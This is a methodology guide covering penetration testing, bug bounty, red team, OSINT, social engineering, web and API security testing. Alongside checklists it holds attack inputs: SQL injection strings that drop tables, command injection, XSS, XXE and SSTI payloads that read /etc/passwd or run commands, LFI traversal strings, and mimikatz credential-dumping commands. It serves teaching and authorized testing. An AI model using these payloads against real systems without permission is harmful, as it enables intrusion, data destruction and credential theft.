# Security Testing Methodologies & Frameworks

## Table of Contents
1. [Penetration Testing Methodology](#penetration-testing-methodology)
2. [Bug Bounty Hunting Structured Approaches](#bug-bounty-hunting-structured-approaches)
3. [Vulnerability Assessment Frameworks](#vulnerability-assessment-frameworks)
4. [OWASP Testing Methodologies](#owasp-testing-methodologies)
5. [Red Team Engagement Phases](#red-team-engagement-phases)
6. [Incident Response Procedures](#incident-response-procedures)
7. [Threat Hunting Methodologies](#threat-hunting-methodologies)
8. [Risk Assessment Frameworks](#risk-assessment-frameworks)
9. [OSINT Investigation Workflows](#osint-investigation-workflows)
10. [Social Engineering Testing Phases](#social-engineering-testing-phases)
11. [Web Application Testing Methodologies](#web-application-testing-methodologies)
12. [API Security Testing Approaches](#api-security-testing-approaches)

---

## 1. Penetration Testing Methodology

### Overview
Penetration Testing is a simulated cyberattack performed to evaluate the security of a system. The primary objective is to identify vulnerabilities that an attacker could exploit.

### Phases of Penetration Testing

#### Phase 1: Reconnaissance (Information Gathering)
**Objective**: Gather information about the target system, network, and organization.

**Sub-phases**:
- **Passive Reconnaissance**:
  - OSINT gathering
  - DNS enumeration
  - Social media intelligence
  - Public document analysis

- **Active Reconnaissance**:
  - Port scanning
  - Service detection
  - Network mapping

**Tools & Commands**:
```bash
# Network scanning
nmap -sS -sV -oN scan.txt target.com
nmap -A target.com

# Information gathering
theharvester -d target.com -l 500 -b google
shodan search apache
```

**Deliverables**:
- Network topology map
- Service inventory
- Potential attack vectors identified

#### Phase 2: Scanning
**Objective**: Identify open ports, services, and vulnerabilities using scanning tools.

**Activities**:
- Port scanning
- Service enumeration
- Vulnerability scanning
- Network mapping

**Tools & Commands**:
```bash
# Vulnerability scanning
nessuscli -scan policy_id
openvas-cli start scan

# Advanced port scanning
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
```

#### Phase 3: Exploitation
**Objective**: Use gathered information to exploit vulnerabilities.

**Activities**:
- Vulnerability exploitation
- Privilege escalation
- Payload delivery
- System compromise

**Tools & Commands**:
```bash
# Exploitation frameworks
msfconsole
use exploit/windows/smb/ms17_010_eternalblue

# SQL injection
sqlmap -u http://target.com/vulnerablepage --dbs
```

#### Phase 4: Post-Exploitation
**Objective**: Explore further weaknesses, elevate privileges, and maintain persistence.

**Activities**:
- Privilege escalation
- Lateral movement
- Data exfiltration
- Persistence establishment
- Evidence collection

**Tools & Commands**:
```bash
# Credential dumping
mimikatz.exe

# Persistence
use post/windows/manage/persistence
```

#### Phase 5: Reporting
**Objective**: Document findings, vulnerabilities, exploits, and recommendations.

**Report Structure**:
- Executive Summary
- Technical Findings
- Risk Assessment
- Proof of Concepts (PoCs)
- Recommendations
- Screenshots and evidence

---

## 2. Bug Bounty Hunting Structured Approaches

### Bug Bounty Methodology Framework

#### Phase 1: Target Selection & Scope Analysis
**Steps**:
1. **Program Research**
   - Review bug bounty platforms (HackerOne, Bugcrowd, Intigriti)
   - Analyze program scope and rules
   - Check payout history and response times

2. **Scope Verification**
   - Identify in-scope assets
   - Note out-of-scope items
   - Understand testing limitations

#### Phase 2: Reconnaissance
**Systematic Information Gathering**:

1. **Subdomain Enumeration**
```bash
# Passive enumeration
subfinder -d target.com -silent | httpx -status-code -title
amass enum -passive -d target.com

# Active enumeration
subfinder -d target.com -all -recursive > subdomains.txt
```

2. **Asset Discovery**
```bash
# Live host identification
cat subdomains.txt | httprobe | tee -a alive_hosts.txt

# Port scanning
naabu -list alive_hosts.txt -c 50 -nmap-cli 'nmap -sV -sC'
```

3. **Content Discovery**
```bash
# Directory fuzzing
ffuf -w /path/to/wordlist -u https://target.com/FUZZ -t 50

# Technology identification
whatweb target.com
wappalyzer
```

#### Phase 3: Vulnerability Assessment

1. **Automated Scanning**
```bash
# Multi-vulnerability scanner
nuclei -l targets.txt -t ~/nuclei-templates/

# Web application scanner
nikto -h target.com -o nikto_report.txt
```

2. **Manual Testing Priority**
   - Authentication bypass
   - Authorization flaws
   - Input validation issues
   - Business logic flaws

#### Phase 4: Exploitation & PoC Development
**Structured Testing Approach**:

1. **High-Impact Vulnerabilities**:
   - SQL Injection
   - Remote Code Execution
   - Authentication bypass
   - SSRF (Server-Side Request Forgery)

2. **Medium-Impact Vulnerabilities**:
   - XSS (Cross-Site Scripting)
   - IDOR (Insecure Direct Object Reference)
   - CSRF (Cross-Site Request Forgery)
   - XXE (XML External Entity)

### Bug Bounty Testing Checklist

#### Reconnaissance Checklist
- [ ] Subdomain enumeration completed
- [ ] Live hosts identified
- [ ] Port scanning performed
- [ ] Technology stack identified
- [ ] Directory/content discovery
- [ ] Parameter discovery
- [ ] JavaScript file analysis
- [ ] Social media reconnaissance

#### Vulnerability Testing Checklist
- [ ] SQL injection testing
- [ ] XSS (all types) testing
- [ ] IDOR testing
- [ ] SSRF testing
- [ ] XXE testing
- [ ] CSRF testing
- [ ] File upload testing
- [ ] Authentication bypass attempts
- [ ] Authorization flaw testing
- [ ] Business logic testing

---

## 3. Vulnerability Assessment Frameworks

### Vulnerability Management Methodology

#### Phase 1: Discovery
**Objective**: Identify vulnerabilities across the environment.

**Activities**:
- Asset inventory
- Vulnerability scanning
- Configuration assessment
- Code review (if applicable)

**Tools**:
```bash
# Network vulnerability scanning
nessus -i policy.conf target_list.txt
openvas-cli -g

# Web application scanning
zap-cli quick-scan https://target.com
```

#### Phase 2: Classification & Prioritization
**Risk-Based Prioritization**:

1. **CVSS Scoring**
   - Base Score calculation
   - Environmental Score adjustment
   - Temporal Score consideration

2. **Business Impact Assessment**
   - Asset criticality
   - Data sensitivity
   - Regulatory requirements

3. **Exploit Availability**
   - Public exploits
   - Metasploit modules
   - Active exploitation

#### Phase 3: Remediation Planning
**Remediation Strategy**:

1. **Critical Vulnerabilities** (24-48 hours)
2. **High Vulnerabilities** (1 week)
3. **Medium Vulnerabilities** (1 month)
4. **Low Vulnerabilities** (Quarterly)

#### Phase 4: Verification
**Post-Remediation Testing**:
- Re-scan affected systems
- Verify patch effectiveness
- Confirm no new issues introduced

---

## 4. OWASP Testing Methodologies

### OWASP Testing Guide Framework

#### Information Gathering Testing
1. **Conduct Search Engine Discovery Reconnaissance**
2. **Fingerprint Web Server**
3. **Review Webserver Metafiles**
4. **Enumerate Applications on Webserver**
5. **Review Webpage Comments and Metadata**
6. **Identify application entry points**
7. **Map execution paths through application**
8. **Fingerprint Web Application Framework**
9. **Fingerprint Web Application**
10. **Map Application Architecture**

#### Configuration and Deployment Management Testing
1. **Test Network/Infrastructure Configuration**
2. **Test Application Platform Configuration**
3. **Test File Extensions Handling**
4. **Review Old, Backup and Unreferenced Files**
5. **Enumerate Infrastructure and Application Admin Interfaces**
6. **Test HTTP Methods**
7. **Test HTTP Strict Transport Security**
8. **Test RIA cross domain policy**
9. **Test File Permission**
10. **Test for Subdomain Takeover**

#### Identity Management Testing
1. **Test Role Definitions**
2. **Test User Registration Process**
3. **Test Account Provisioning Process**
4. **Testing for Account Enumeration and Guessable User Account**
5. **Testing for Weak or Unenforced Username Policy**

#### Authentication Testing
1. **Testing for Credentials Transported over an Encrypted Channel**
2. **Testing for default credentials**
3. **Testing for Weak lock out mechanism**
4. **Testing for bypassing authentication schema**
5. **Test remember password functionality**
6. **Testing for Browser cache weakness**
7. **Testing for Weak password policy**
8. **Testing for Weak security question/answer**
9. **Testing for weak password change or reset functionalities**
10. **Testing for Weaker authentication in alternative channel**

#### Authorization Testing
1. **Testing Directory traversal/file include**
2. **Testing for bypassing authorization schema**
3. **Testing for Privilege Escalation**
4. **Testing for Insecure Direct Object References**

### OWASP Top 10 Testing Methodology

#### A1: Injection
**Testing Steps**:
1. **SQL Injection**:
```bash
# Automated testing
sqlmap -u "http://target.com/page?id=1" --dbs

# Manual testing
# Test: ' OR '1'='1
# Test: '; DROP TABLE users; --
```

2. **NoSQL Injection**:
```bash
# MongoDB injection
{"username": {"$ne": null}, "password": {"$ne": null}}
```

3. **Command Injection**:
```bash
# Test payloads
; ls -la
| whoami
& ping -c 4 127.0.0.1
```

#### A2: Broken Authentication
**Testing Checklist**:
- [ ] Default credentials testing
- [ ] Brute force protection
- [ ] Session management
- [ ] Password policy enforcement
- [ ] Account lockout mechanism

#### A3: Sensitive Data Exposure
**Testing Steps**:
- [ ] HTTPS usage
- [ ] Data encryption at rest
- [ ] Sensitive data in logs
- [ ] Information disclosure

---

## 5. Red Team Engagement Phases

### Red Team Methodology

#### Phase 1: Initial Reconnaissance
**Objective**: Gather intelligence about the target organization.

**Activities**:
- OSINT collection
- Social media analysis
- Public infrastructure analysis
- Employee information gathering

**Tools**:
```bash
# OSINT gathering
theharvester -d target.com -b all
recon-ng
maltego
```

#### Phase 2: Initial Access
**Objective**: Gain initial foothold in target environment.

**Attack Vectors**:
1. **Phishing Campaigns**
```bash
# Social Engineer Toolkit
setoolkit
# Select: Social-Engineering Attacks > Spear-Phishing Attack Vectors
```

2. **Public-facing Application Exploitation**
```bash
# Vulnerability exploitation
msfconsole
search type:exploit app:web
```

3. **Supply Chain Attacks**
4. **Remote Services Exploitation**

#### Phase 3: Lateral Movement
**Objective**: Move across the network to access high-value targets.

**Techniques**:
1. **Credential Dumping**
```bash
# Mimikatz
sekurlsa::logonpasswords
sekurlsa::tickets
```

2. **Network Enumeration**
```bash
# BloodHound for AD enumeration
bloodhound-python -u username -p password -d domain.com
```

3. **Living off the Land**
```bash
# PowerShell Empire
powershell -ep bypass
Import-Module .\PowerSploit.psd1
```

#### Phase 4: Persistence
**Objective**: Maintain long-term access to compromised systems.

**Techniques**:
- Registry modification
- Scheduled tasks
- Service installation
- WMI event subscriptions

#### Phase 5: Exfiltration
**Objective**: Extract valuable data while avoiding detection.

**Methods**:
- DNS tunneling
- HTTPS exfiltration
- Cloud storage services
- Email-based exfiltration

---

## 6. Incident Response Procedures

### NIST Incident Response Framework

#### Phase 1: Preparation
**Activities**:
- [ ] Incident response policy development
- [ ] Team formation and training
- [ ] Tool procurement and configuration
- [ ] Communication procedures establishment

**Deliverables**:
- Incident Response Plan
- Contact lists
- Incident classification schema
- Response toolkit

#### Phase 2: Detection and Analysis
**Detection Sources**:
- SIEM alerts
- IDS/IPS notifications
- User reports
- Third-party notifications

**Analysis Steps**:
1. **Initial Assessment**
   - Verify incident authenticity
   - Determine incident scope
   - Classify incident severity

2. **Evidence Collection**
   - System logs
   - Network traffic
   - Memory dumps
   - Disk images

**Tools**:
```bash
# Log analysis
splunk search "index=security"
grep -i "error\|fail\|attack" /var/log/syslog

# Network analysis
wireshark -i eth0
tcpdump -i eth0 -w capture.pcap
```

#### Phase 3: Containment
**Short-term Containment**:
- Network isolation
- System shutdown
- Account disabling
- Service termination

**Long-term Containment**:
- System patching
- Configuration changes
- Access control updates
- Monitoring enhancement

#### Phase 4: Eradication
**Activities**:
- [ ] Malware removal
- [ ] System hardening
- [ ] Vulnerability patching
- [ ] Configuration correction

#### Phase 5: Recovery
**Activities**:
- [ ] System restoration
- [ ] Service verification
- [ ] Monitoring implementation
- [ ] Business operations resumption

#### Phase 6: Lessons Learned
**Activities**:
- [ ] Incident documentation
- [ ] Response effectiveness analysis
- [ ] Process improvement identification
- [ ] Training needs assessment

---

## 7. Threat Hunting Methodologies

### Threat Hunting Framework

#### Phase 1: Hypothesis Creation
**Hypothesis Development**:
1. **Intelligence-driven Hypotheses**
   - Based on current threat intelligence
   - IOCs from recent attacks
   - TTPs of known threat actors

2. **Situational Hypotheses**
   - Based on current events
   - Industry-specific threats
   - Organizational changes

**Example Hypotheses**:
- Attackers are using legitimate admin tools for lateral movement
- Data exfiltration is occurring during off-hours
- Compromised accounts are accessing unusual resources

#### Phase 2: Data Collection
**Data Sources**:
- Network logs
- Endpoint logs
- Authentication logs
- DNS logs
- Email logs

**Tools**:
```bash
# Log aggregation
splunk
elk-stack (Elasticsearch, Logstash, Kibana)

# Network monitoring
wireshark
tcpdump
```

#### Phase 3: Analysis
**Analysis Techniques**:
1. **Statistical Analysis**
   - Baseline establishment
   - Anomaly detection
   - Frequency analysis

2. **Behavioral Analysis**
   - User behavior analytics
   - Entity behavior analytics
   - Network behavior analysis

**Analysis Tools**:
```bash
# Statistical analysis
python pandas
R statistical software

# Visualization
kibana dashboards
grafana
```

#### Phase 4: Investigation
**Investigation Steps**:
1. **Anomaly Validation**
2. **Root Cause Analysis**
3. **Impact Assessment**
4. **Attribution Analysis**

#### Phase 5: Response
**Response Actions**:
- Containment measures
- Evidence preservation
- Stakeholder notification
- Remediation planning

---

## 8. Risk Assessment Frameworks

### NIST Risk Assessment Methodology

#### Step 1: System Characterization
**Activities**:
- [ ] System boundary identification
- [ ] Information type identification
- [ ] Security control identification
- [ ] System architecture documentation

#### Step 2: Threat Identification
**Threat Sources**:
- Natural threats
- Human threats (intentional)
- Human threats (unintentional)
- Environmental threats

**Threat Analysis**:
```
Threat Source -> Threat Event -> Vulnerability -> Impact
```

#### Step 3: Vulnerability Assessment
**Vulnerability Categories**:
- Technical vulnerabilities
- Procedural vulnerabilities
- Physical vulnerabilities
- Personnel vulnerabilities

**Assessment Methods**:
- Vulnerability scanners
- Penetration testing
- Security assessments
- Code reviews

#### Step 4: Impact Analysis
**Impact Categories**:
- Confidentiality impact
- Integrity impact
- Availability impact

**Impact Levels**:
- Low
- Moderate
- High

#### Step 5: Risk Determination
**Risk Calculation**:
```
Risk = Threat Likelihood × Vulnerability Severity × Asset Value
```

**Risk Matrix**:
| Likelihood | Low Impact | Moderate Impact | High Impact |
|------------|------------|-----------------|-------------|
| High       | Medium     | High            | High        |
| Moderate   | Low        | Medium          | High        |
| Low        | Low        | Low             | Medium      |

#### Step 6: Risk Mitigation
**Mitigation Strategies**:
- Accept risk
- Avoid risk
- Transfer risk
- Mitigate risk

---

## 9. OSINT Investigation Workflows

### OSINT Methodology Framework

#### Phase 1: Planning and Requirements
**Requirements Definition**:
- [ ] Investigation objectives
- [ ] Information requirements
- [ ] Legal and ethical constraints
- [ ] Timeline and resources

#### Phase 2: Data Collection
**Information Sources**:

1. **Search Engines**:
```bash
# Google dorking
site:target.com filetype:pdf
inurl:admin
intitle:"index of"
```

2. **Social Media**:
   - LinkedIn profiles
   - Twitter posts
   - Facebook information
   - Instagram photos

3. **Domain/Network Information**:
```bash
# DNS enumeration
dig target.com ANY
whois target.com
nslookup target.com

# Subdomain discovery
subfinder -d target.com
amass enum -d target.com
```

4. **Public Records**:
   - Company filings
   - Patent databases
   - News articles
   - Government records

#### Phase 3: Data Processing
**Processing Techniques**:
- Data normalization
- Duplicate removal
- Relevance filtering
- Timeline creation

**Tools**:
```bash
# Automation tools
theHarvester
recon-ng
spiderfoot
maltego
```

#### Phase 4: Analysis
**Analysis Methods**:
1. **Link Analysis**
2. **Pattern Recognition**
3. **Timeline Analysis**
4. **Geolocation Analysis**

#### Phase 5: Reporting
**Report Structure**:
- Executive summary
- Methodology
- Findings
- Supporting evidence
- Recommendations

---

## 10. Social Engineering Testing Phases

### Social Engineering Methodology

#### Phase 1: Information Gathering
**Target Research**:
- [ ] Organizational structure
- [ ] Employee information
- [ ] Company culture
- [ ] Technology stack
- [ ] Security awareness level

**Sources**:
- Company website
- Social media
- Job postings
- News articles
- Public presentations

#### Phase 2: Pretext Development
**Pretext Elements**:
- Believable scenario
- Authority establishment
- Urgency creation
- Trust building

**Common Pretexts**:
- IT support
- Management directive
- External auditor
- Vendor representative

#### Phase 3: Attack Vector Selection
**Attack Vectors**:

1. **Email Phishing**:
```bash
# GoPhish campaign
gophish
# Configure templates, landing pages, and targets
```

2. **Voice Phishing (Vishing)**:
   - Phone calls
   - VoIP spoofing
   - Social proof

3. **Physical Social Engineering**:
   - Tailgating
   - Pretexting
   - Baiting
   - Quid pro quo

#### Phase 4: Execution
**Execution Steps**:
1. Initial contact
2. Rapport building
3. Information elicitation
4. Goal achievement

#### Phase 5: Reporting
**Report Components**:
- Attack success rate
- Information obtained
- Security gaps identified
- Training recommendations

---

## 11. Web Application Testing Methodologies

### Comprehensive Web Application Testing Framework

#### Phase 1: Information Gathering
**Reconnaissance Activities**:

1. **Technology Identification**:
```bash
# Technology fingerprinting
whatweb target.com
wappalyzer target.com
```

2. **Content Discovery**:
```bash
# Directory enumeration
dirsearch -u https://target.com
gobuster dir -u https://target.com -w /path/to/wordlist

# File discovery
ffuf -w wordlist.txt -u https://target.com/FUZZ
```

3. **Parameter Discovery**:
```bash
# Parameter fuzzing
arjun -u https://target.com/page
paramspider -d target.com
```

#### Phase 2: Authentication Testing
**Test Cases**:
- [ ] Default credentials
- [ ] Brute force protection
- [ ] Password policy
- [ ] Session management
- [ ] Multi-factor authentication
- [ ] Password reset functionality

**Testing Commands**:
```bash
# Brute force testing
hydra -l admin -P /path/to/passwords.txt target.com http-post-form

# Session analysis
burp suite professional
```

#### Phase 3: Authorization Testing
**Test Cases**:
- [ ] Privilege escalation
- [ ] Horizontal privilege escalation
- [ ] Vertical privilege escalation
- [ ] Directory traversal
- [ ] File inclusion

#### Phase 4: Input Validation Testing

1. **SQL Injection Testing**:
```bash
# Automated testing
sqlmap -u "https://target.com/page?id=1" --dbs

# Manual payloads
' OR '1'='1' --
'; DROP TABLE users; --
1' UNION SELECT 1,2,3 --
```

2. **XSS Testing**:
```bash
# Reflected XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

# DOM XSS
javascript:alert('XSS')

# Stored XSS
<svg onload=alert('XSS')>
```

3. **XXE Testing**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### Phase 5: Business Logic Testing
**Test Areas**:
- [ ] Workflow bypass
- [ ] Price manipulation
- [ ] Quantity limits
- [ ] Race conditions
- [ ] Time-based attacks

#### Phase 6: Client-Side Testing
**Test Cases**:
- [ ] DOM manipulation
- [ ] JavaScript analysis
- [ ] Local storage security
- [ ] CORS configuration
- [ ] CSP bypass

### Specific Vulnerability Testing Methodologies

#### LFI (Local File Inclusion) Methodology
**Testing Process**:
1. **Parameter Identification**:
```bash
# Find potential LFI parameters
gau target.com | gf lfi | uro
```

2. **Payload Testing**:
```bash
# LFI payloads
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd

# Automated testing
ffuf -u "https://target.com/page?file=FUZZ" -w lfi-payloads.txt -mr "root:"
```

3. **Advanced Techniques**:
- PHP wrappers: `php://filter/convert.base64-encode/resource=`
- Data wrapper: `data://text/plain,<?php phpinfo(); ?>`
- Log poisoning
- ZIP wrapper exploitation

#### SSTI (Server-Side Template Injection) Methodology
**Detection**:
```bash
# Basic detection payloads
{{7*7}}
${7*7}
<%= 7*7 %>
#{ 7*7 }
```

**Exploitation**:
```bash
# Jinja2 (Flask)
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Twig (Symfony)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}
```

#### CSRF Testing Methodology
**Test Cases**:
1. **CSRF Token Validation**:
   - Missing CSRF token
   - Invalid CSRF token
   - CSRF token reuse

2. **SameSite Cookie Testing**:
   - None value
   - Lax value
   - Strict value

---

## 12. API Security Testing Approaches

### API Security Testing Framework

#### Phase 1: API Discovery
**Discovery Methods**:
1. **Passive Discovery**:
```bash
# Documentation analysis
burp suite spider
waybackurls target.com | grep -i api

# JavaScript file analysis
cat js-files.txt | grep -i api
```

2. **Active Discovery**:
```bash
# Directory enumeration
ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt

# Version enumeration
ffuf -u https://target.com/api/v{FUZZ}/users -w versions.txt
```

#### Phase 2: API Enumeration
**Enumeration Activities**:
- [ ] Endpoint identification
- [ ] HTTP method enumeration
- [ ] Parameter discovery
- [ ] Rate limiting analysis
- [ ] Authentication mechanism identification

**Tools & Techniques**:
```bash
# HTTP method testing
curl -X OPTIONS https://api.target.com/users
curl -X PATCH https://api.target.com/users/1

# Parameter fuzzing
arjun -u https://api.target.com/users -m POST
```

#### Phase 3: Authentication & Authorization Testing
**Test Cases**:

1. **Authentication Bypass**:
```bash
# JWT testing
jwt_tool token.jwt

# API key testing
curl -H "X-API-Key: invalid" https://api.target.com/data
```

2. **Authorization Testing**:
```bash
# IDOR testing
curl -H "Authorization: Bearer token" https://api.target.com/users/1
curl -H "Authorization: Bearer token" https://api.target.com/users/2
```

#### Phase 4: Input Validation Testing
**Test Areas**:

1. **JSON Injection**:
```json
{
  "username": "admin",
  "password": {"$ne": ""}
}
```

2. **XML Injection**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>
```

3. **SQL Injection in APIs**:
```bash
# Parameter-based SQLi
curl -X POST -d "user_id=1' OR '1'='1" https://api.target.com/users
```

#### Phase 5: Business Logic Testing
**API-Specific Tests**:
- [ ] Rate limiting bypass
- [ ] Mass assignment
- [ ] GraphQL introspection
- [ ] Excessive data exposure
- [ ] Improper asset management

### API Testing Checklist

#### OWASP API Security Top 10

1. **API1:2019 Broken Object Level Authorization**
   - [ ] Test IDOR in API endpoints
   - [ ] Verify authorization at object level
   - [ ] Test bulk operations

2. **API2:2019 Broken User Authentication**
   - [ ] Test authentication mechanisms
   - [ ] Verify token validation
   - [ ] Test session management

3. **API3:2019 Excessive Data Exposure**
   - [ ] Analyze response data
   - [ ] Check for PII exposure
   - [ ] Test data filtering

4. **API4:2019 Lack of Resources & Rate Limiting**
   - [ ] Test rate limiting
   - [ ] Verify resource quotas
   - [ ] Test DoS scenarios

5. **API5:2019 Broken Function Level Authorization**
   - [ ] Test admin functions
   - [ ] Verify role-based access
   - [ ] Test privilege escalation

6. **API6:2019 Mass Assignment**
   - [ ] Test parameter binding
   - [ ] Verify input filtering
   - [ ] Test object modification

7. **API7:2019 Security Misconfiguration**
   - [ ] Check CORS configuration
   - [ ] Verify HTTP headers
   - [ ] Test error handling

8. **API8:2019 Injection**
   - [ ] Test SQL injection
   - [ ] Test NoSQL injection
   - [ ] Test command injection

9. **API9:2019 Improper Assets Management**
   - [ ] Test deprecated versions
   - [ ] Verify endpoint inventory
   - [ ] Check documentation accuracy

10. **API10:2019 Insufficient Logging & Monitoring**
    - [ ] Test security event logging
    - [ ] Verify monitoring coverage
    - [ ] Test incident response

---

## Testing Tools Reference

### Reconnaissance Tools
- **subfinder**: Subdomain discovery
- **amass**: Network mapping and subdomain enumeration
- **httpx**: HTTP toolkit for probing
- **nmap**: Network discovery and security auditing
- **masscan**: Fast port scanner
- **gobuster**: Directory/DNS/VHost busting tool

### Web Application Testing Tools
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Web application security scanner
- **sqlmap**: Automatic SQL injection tool
- **nuclei**: Vulnerability scanner
- **ffuf**: Fast web fuzzer
- **arjun**: HTTP parameter discovery

### API Testing Tools
- **Postman**: API development and testing
- **Insomnia**: REST API client
- **jwt_tool**: JWT security testing
- **GraphQL Playground**: GraphQL testing interface

### Network Security Tools
- **nessus**: Vulnerability scanner
- **OpenVAS**: Open-source vulnerability scanner
- **wireshark**: Network protocol analyzer
- **tcpdump**: Network packet analyzer

### OSINT Tools
- **theHarvester**: Email, subdomain and people names harvester
- **recon-ng**: Web reconnaissance framework
- **maltego**: Link analysis and data mining
- **spiderfoot**: Automated OSINT collection

### Exploitation Tools
- **Metasploit**: Penetration testing framework
- **Empire**: Post-exploitation framework
- **mimikatz**: Windows credential extraction
- **BloodHound**: Active Directory reconnaissance

---

## Reporting Templates

### Vulnerability Report Template
```
Title: [Vulnerability Type] in [Component/Function]

Severity: [Critical/High/Medium/Low]

Summary:
[Brief description of the vulnerability]

Steps to Reproduce:
1. [Step 1]
2. [Step 2]
3. [Step 3]

Impact:
[Description of potential impact]

Proof of Concept:
[Screenshots, commands, or code demonstrating the vulnerability]

Recommendations:
1. [Recommendation 1]
2. [Recommendation 2]

References:
- [Relevant CVE or advisory]
- [OWASP reference]
```

### Penetration Test Report Structure
1. **Executive Summary**
2. **Scope and Methodology**
3. **Risk Assessment Summary**
4. **Technical Findings**
5. **Detailed Vulnerability Analysis**
6. **Recommendations**
7. **Appendices**

This comprehensive methodologies document provides structured approaches for various security testing scenarios. Each methodology includes clear phases, step-by-step procedures, checklists, and practical commands for implementation. Use these frameworks as starting points and adapt them based on specific testing requirements and organizational needs.